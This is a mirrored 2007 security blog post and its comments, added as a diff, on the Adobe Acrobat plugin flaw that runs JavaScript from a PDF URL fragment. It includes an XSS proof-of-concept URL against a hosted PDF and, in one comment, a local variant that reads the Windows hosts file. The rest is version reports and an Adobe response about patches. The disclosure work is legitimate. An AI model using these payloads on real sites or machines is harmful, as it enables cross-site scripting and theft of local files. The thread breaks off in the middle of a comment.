@@ -1,0 +1,739 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/danger-danger-danger/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:21:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; DANGER, DANGER, DANGER</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; DANGER, DANGER, DANGER Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='The year of 2007' href='../the-year-of-2007/index.html' />
+<link rel='next' title='Universal PDF XSS After Party' href='../universal-pdf-xss-after-party/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index86fa.html?p=135' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-135" class="post">
+	<div class="post-title"><h2><span>DANGER, DANGER, DANGER</span></h2></div>
+	<div class="post-date"><span>published:</span> January 3rd, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>The WEB has gone crazy. I know that this is not news for some of you but you will be surprised to what extend this craziness has just developed. Among the traditional <a href="../backdooring-quicktime-movies/index.html">QuickTime Movie</a>, <a href="../backdooring-mp3-files/index.html">QTL</a>, <a href="../backdooring-flash-objects-receipt/index.html">Flash</a>, <a href="../backdooring-images/index.html">Image</a>, <a href="../backdooring-web-pages/index.html">HTML</a> and <a href="http://michaeldaw.org/md-hacks/backdooring-pdf-files/">PDF</a> vulnerabilities, there is now another one trivially exploitable with somewhat high degree of impact.</p>
+
+<blockquote>So we have changed a lot of diapers last year. Simple things we do suddenly have become very dangerous and risky. If you think that user supplied Image files are safe, think again. There were <a href="../myspace-quicktime-worm-follow-up/index.html">several attacks affecting social networks</a> and a couple of <a href="../../topics/myspace-worms.html">very successful AJAX worms</a>, again affecting social networks, during the last year. However, it seams that we haven&#8217;t really scratch the surface yet.</blockquote>
+
+<p>Back in September 2006 David and I had a <a href="http://michaeldaw.org/md-hacks/backdooring-pdf-files/">small adventure with Adobe&#8217;s PDF technology</a>. David made several issues with JavaScript for PDF publicly available and the findings were quite shocking for many people including us. Today, it seams that PDF documents can execute JavaScript code for no apparent reason by using the following template.</p>
+
+<pre><code>http://<strong>path/to/pdf/file.pdf</strong>#<strong>whatever_name_you_want</strong>=javascript:<strong>your_code_here</strong></code></pre>
+
+<p>You must understand that the attacker doesn&#8217;t need to have write access to the specified PDF document. In order to get an XSS vector working you need to have a PDF file hosted on the target and that&#8217;s all about it. The rest is just a matter of your abilities and desires.</p>
+
+<p>This <a href="http://www.disenchant.ch/blog/hacking-with-browser-plugins/34">finding was originally mentioned</a> by <a href="http://www.disenchant.ch/blog">Sven Vetsch</a>, on his blog. The attack vector was <a href="http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html">discovered by Stefano Di Paola and Giorgio Fedon</a>. This is a very good and quite interesting finding. Good work.</p>
+
+<p><em>Just to show you the impact of this issue I prepared the following POC.</em></p>
+
+<pre><code><a href="http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function createXMLHttpRequest(){   try{ return new ActiveXObject('Msxml2.XMLHTTP'); }catch(e){}   try{ return new ActiveXObject('Microsoft.XMLHTTP'); }catch(e){}   try{ return new XMLHttpRequest(); }catch(e){}   return null;}var xhr = createXMLHttpRequest();xhr.onreadystatechange = function(){    if (xhr.readyState == 4)        alert(xhr.responseText);};xhr.open('GET', 'http://www.google.com', true);xhr.send(null);
+">http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function createXMLHttpRequest(){   try{ return new ActiveXObject('Msxml2.XMLHTTP'); }catch(e){}   try{ return new ActiveXObject('Microsoft.XMLHTTP'); }catch(e){}   try{ return new XMLHttpRequest(); }catch(e){}   return null;}var xhr = createXMLHttpRequest();xhr.onreadystatechange = function(){    if (xhr.readyState == 4)        alert(xhr.responseText);};xhr.open('GET', 'http://www.google.com', true);xhr.send(null);
+</a></code></pre>
+
+<p>When you open the PDF document, an XMLHttpRequest will be made to google.com and the front page source code will be displayed inside an alert box. Obviously, attackers can create a lot more dangerous scenario, where highly sensitive information is leaked leaving the user totally blind of what is going on.</p>
+
+<p>This attack vector has several benefits that I must elaborate on. First of all, it is obvious that this is not a server side problem. This is totally client side and Web app owners cannot do much about it. The only solution is to have Adobe release a patch as soon as possible or just not to host PDF files at all. Obviously the second solution is highly unfeasible. This leave us with Adobe fixing the bug, but let&#8217;s be honest with each other. Things won&#8217;t get better. It is not that Adobe don&#8217;t have good guys there or they are irresponsible. It is just the fact that not that many people update their PDF reader mainly because it usually requires a large chunk of data being downloaded and installed. The process is very slow and bulky and puts off even security-minded people.</p>
+
+<p><em>Now we have a prove that every site on this planet is vulnerable to XSS (Cross-site scripting). This is definitely not nice. Unwillingly we have become solicitors of a very dangerous craft.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/attack/index.html" rel="tag">attack</a> | <a href="../../tags/pdf/index.html" rel="tag">pdf</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-admin even thread-even depth-1" id="comment-1761">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1761">
+			January 3, 2007 at 2:23 am</a>		</div>
+
+		<p>BTW, on Window PRO SP 2, only FF is vulnerable.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1771">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3bbe8f9497e48741f842120888bc5ed2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.disenchant.ch/' rel='external nofollow' class='url'>Disenchant / Sven Vetsch</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1771">
+			January 3, 2007 at 8:38 am</a>		</div>
+
+		<p>As I just added to my blog entry and wrote to the mailinglists:</p>
+<p>It seems that I didnâ€™t copy paste the credits out of my document I wrote with the content of this entry :(<br />
+Of course Iâ€™ve to give some credit to Stefano Di Paola and Giorgio Fedon because they found this flaw and not me at all.<br />
+As you see, I edited my blog entry. Next time Iâ€™ll be more careful and perhaps donâ€™t write blog entries when Iâ€™m as tired as I was when I wrote it.</p>
+<p>@pdp<br />
+Please also edit your blog entry. thx</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1773">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/1d95d2324345e3dd2e41d6066cc1b492?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://michaeldaw.org/' rel='external nofollow' class='url'>David Kierznowski</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1773">
+			January 3, 2007 at 8:47 am</a>		</div>
+
+		<p>pdp, I haven&#8217;t tested this yet but it looks like a great find. </p>
+<p>Users with Foxit PDF viewer are not vulnerable to this; at least those without the JavaScript plugin installed (the default). So those who learn&#8217;t last time round should be ok.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1775">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1775">
+			January 3, 2007 at 10:02 am</a>		</div>
+
+		<p>Sven, fixed!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1788">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b3488a2f75f84d7b7b53fddc7dc4aed9?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Tester Zero</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1788">
+			January 3, 2007 at 2:12 pm</a>		</div>
+
+		<p>This flaw could be really bad.  Think of all those pfd files hosted by online banks.<br />
+<a href="http://www.google.com/search?q=site%3Abankofamerica.com%2F+inurl%3Apdf&amp;btnG=Search" rel="nofollow">http://www.google.com/search?q.....tnG=Search</a></p>
+<p>A phisher could do some real damage.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1791">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f232a620bb7c3e0d556a8152386bdf69?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.widgetlogic.com/' rel='external nofollow' class='url'>Jason Duke</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1791">
+			January 3, 2007 at 4:22 pm</a>		</div>
+
+		<p>It seems to not be replicatable on IE6 or IE7 for me, although is with FF.</p>
+<p>Any thoughts ?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin even thread-even depth-1" id="comment-1794">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1794">
+			January 3, 2007 at 5:28 pm</a>		</div>
+
+		<p>Tester Zero, indeed.</p>
+<p>Jason, yes&#8230; although some people are getting different results. For example, the following conditions are exploitable:</p>
+<ul>
+<li>IE 6 SP 1 with version of Acro Reader older than 8.0</li>
+<li>Firefox 2.0.0.1 win32</li>
+<li>Firefox 1.5.0.8 win32</li>
+<li>Opera 8.5.4 build 770 win32</li>
+<li>Opera 9.10.8679 win32</li>
+</ul>
+<p>The damage is huge.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1798">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3eda6fcd3204ef285fa52176c28c4d3e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">saso</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1798">
+			January 3, 2007 at 6:16 pm</a>		</div>
+
+		<p>according to the this page from the original author of this article from CCC this is already fixed in adobe acrobat 8 (as far as we talk strictly about the pdf issue since the original topic of the article is more wide/general about ajax/web2 attacks)</p>
+<p><a href="http://www.wisec.it/vulns.php?page=9" rel="nofollow">http://www.wisec.it/vulns.php?page=9</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1799">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a69965c15b2bdfbc552673feb409dc1e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://michaelzupan.com/' rel='external nofollow' class='url'>mike</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1799">
+			January 3, 2007 at 6:50 pm</a>		</div>
+
+		<p>It doesn&#8217;t work in Linux I tried<br />
+- kpdf<br />
+- evince<br />
+- adobe reader 7.0</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1800">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1800">
+			January 3, 2007 at 7:23 pm</a>		</div>
+
+		<p>mike, it affects strickly Adobe Acrobat. saso, several researchers report Acrobat 8 as one of the vulnerable. I guess it depends on that platform and the current acrobat patch level.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1803">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a726471b84c6ee4be1fd312c4c203320?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Kris</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1803">
+			January 3, 2007 at 7:45 pm</a>		</div>
+
+		<p>I couldn&#8217;t replicate it on IE7 with either reader 7 or 8 at all, although I could reproduce the problem on FF.</p>
+<p>Now I&#8217;m starting wonder how huge this really is: Acrobat 8 has been out for at least 6 months, IE7 for 3 or so, and is getting a major push from MS. Either update will fix the problem, and what, 85% or so of the world is still on IE?</p>
+<p>It&#8217;s definitely still a big deal, but it&#8217;s not something companies with a decent software update policy will need to lose sleep over right now.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1804">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c3c67ef1a4beba7889ca36b0c609cad4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">david</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1804">
+			January 3, 2007 at 7:48 pm</a>		</div>
+
+		<p>I&#8217;ve seen a couple of places that the &#8220;wprkaround&#8221; is to turn off JS in your browser. From the client-side, wouldn&#8217;t it be sufficient to just remove/replace the Adobe Acrobat browser plug-in?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1807">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/14336f1c911b9b5e36b601ab02c5bba8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://smaxor.com/' rel='external nofollow' class='url'>Smaxor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1807">
+			January 3, 2007 at 9:20 pm</a>		</div>
+
+		<p>Doesn&#8217;t seem to work in IE6 with Acrobat 7.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1808">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/79133241cc9c11c3b53e32f1648c462d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://weblogs.asp.net/cumpsd' rel='external nofollow' class='url'>CumpsD</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1808">
+			January 3, 2007 at 9:20 pm</a>		</div>
+
+		<p>Windows 2003 R2 SP1, x64, FF 1.5.0.8, Adobe Reader 7.0.8: PoC worked.</p>
+<p>Fixed it by telling FF to give me the download box for pdf files in the future :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin even thread-even depth-1" id="comment-1809">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1809">
+			January 3, 2007 at 9:21 pm</a>		</div>
+
+		<p>Kris, I see you point of veiw but I don&#8217;t quite agree with it. IMHO, this vulnerability will be present for a while. In fact, I can see some development on new types of WEB worms that can simulationsly spread over several social networks. The impact of this issue is huge.</p>
+<p>Web worms can use Jeremiah&#8217;s <a href="http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html" rel="nofollow">css history dump</a> and <a href="http://jeremiahgrossman.blogspot.com/2006/12/i-know-if-youre-logged-in-anywhere.html" rel="nofollow">login detection</a> hacks together with the <a href="../google-search-api-worms/index.html" rel="nofollow">Google AJAX Search API hack</a> in order to create a massive WEB infection. In fact, such type of malicious code can be trivially composed in half an hour. This is a vary scary thought.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1810">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1810">
+			January 3, 2007 at 9:26 pm</a>		</div>
+
+		<p>Smaxor, what&#8217;s your patch level? I have a sneak suspecion that the IE POC works on different SPs.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1811">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/417010b387f0b9f02fa4abb199ab2958?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Leonard Rosenthol</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1811">
+			January 3, 2007 at 9:27 pm</a>		</div>
+
+		<p>A couple of points on this&#8230;</p>
+<p>1) This issues ONLY effects the Windows platform.  Mac, Linux, etc. users are NOT effected.</p>
+<p>2) We found this issue out ourselves during our own security/vulnerability testing of Acrobat and introduced a fix as part of Acrobat/Reader 8 for Windows.  As such, users of Acrobat/Reader 8 (regardless of browser) are NOT EFFECTED!</p>
+<p>3) We already have patches prepared for earlier versions of Acrobat and will release those as soon as they are ready.  This will address those users who are unable/unwilling to upgrade to Acrobat/Reader 8.</p>
+<p>We thank the community for their concern in identifying vulnerabilities in our products and hope that our having the issues already addressed in our current versions will serve to alleviate concerns and demonstrate our commitment to this area.</p>
+<p>Leonard Rosenthol<br />
+Adobe Systems</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1814">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1814">
+			January 3, 2007 at 9:38 pm</a>		</div>
+
+		<p>Leonard, I am not surprised that actions has already been taken. I remember the last time your company respond was quite on time.</p>
+<p>The one million dollar question is: how quickly your update will propagate? I think this is the concerning bit emerging from the current situation.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1815">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b370d492c1af7e32fd6ac0210c56a186?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.deathbeaver.com/' rel='external nofollow' class='url'>kirsplat</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1815">
+			January 3, 2007 at 9:55 pm</a>		</div>
+
+		<p>It does work on Linux &#8211; FF: 1.5.0.9 + adobe reader 7</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1835">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/181047487d339dad357ae9ba6d78ca9a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ross</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1835">
+			January 4, 2007 at 8:34 am</a>		</div>
+
+		<p>The concern I have is that we have a very tight security policy here and this is the first bug I&#8217;ve seen in about 18 months that&#8217;s actually going to affect us.</p>
+<p>Here we have to use IE but only trusted sites are allowed to run any kind of Javascript, ActiveX control, etc.  Non trusted sites can&#8217;t even open PDF files directly so ordinarily vulnerabilities don&#8217;t affect us at all.</p>
+<p>However this bug appears to allow an untrusted site to open a PDF from a trusted site and I can only assume that means it will run the code from the security context of the trusted site too.  That is a very serious concern for us.</p>
+<p>My other concern is that Acrobat Reader is a nightmare to update, it&#8217;s one of the worst programs we have for deploying updates, and I can see this being a popular attack vector because of it&#8217;s widespread use and the problems updating it.</p>
+<p>We&#8217;ll get Acrobat updated on our computers today, but I wonder how long this vulnerability would have gone quietly unnanounced by Adobe&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1836">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7ef1c803c904b9a9834d3bd7645790bb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://mario.heideri.ch/' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1836">
+			January 4, 2007 at 9:15 am</a>		</div>
+
+		<p>And now it&#8217;s local &#8211; credits for the basic PoC go to RSnake.</p>
+<p><a href="file:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#blah=javascript:try%20{var%20req%20=%20new%20XMLHttpRequest();req.open(%22GET%22,%20%22file:///C:/WINDOWS/system32/drivers/etc/hosts%22,%20null);req.send(null);%20alert(req.responseText)%20}%20catch%20(e)%20{console.dir(e)};" rel="nofollow" rel="nofollow">click here</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1837">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ad16ddd0b8edd2e0e5edf26bc2d2635f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bernhard</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1837">
+			January 4, 2007 at 9:21 am</a>		</div>
+
+		<p>I could reproduce with FF 2.0.0.1, Acro 7.0.8 on Win32</p>
+<p>EVEN through Acro had Javascript disabled.<br />
+Obviously, this only affects JS _inside_ the PDF.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1839">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3c914c90ed4a9de0e13dbe34c1bfc28b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Rodrigo Peres</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1839">
+			January 4, 2007 at 11:00 am</a>		</div>
+
+		<p>Tested here with Win 2K SP4, IE6 and Adobe 7.0.5. Seems not vulnerable.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1844">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/15ceeef84bcec075e2dc57c844b8dbcf?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://acidzebra.blogspot.com/' rel='external nofollow' class='url'>Michiel</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1844">
+			January 4, 2007 at 12:15 pm</a>		</div>
+
+		<p>I was going to say &#8220;it doesn&#8217;t work for me&#8221; but then I remembered I uninstalled Adobe PDFbloater and installed Foxit. </p>
+<p>Yay foxit!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin even thread-even depth-1" id="comment-1872">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1872">
+			January 4, 2007 at 8:06 pm</a>		</div>
+
+		<p>btw, here is an updated list of exploitable versions. the info is provided by <a href="http://www.memestreams.net/users/acidus/blogid70277/" rel="nofollow">acidus</a><br />
+Effected Browser: (all on Windows)</p>
+<ul>
+<li>IE6 + Acrobat Reader 7 + XP SP1</li>
+<li>IE6 + Acrobat Reader 4 + XP SP2</li>
+<li>(possibly) IE 6 on non-XP platforms</li>
+<li>Firefox 2.0.0.1</li>
+<li>Firefox 1.5.0.8</li>
+<li>Opera 8.5.4 build 770</li>
+<li>Opera 9.10.8679</li>
+</ul>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1885">
+				<div class="comment-author vcard">
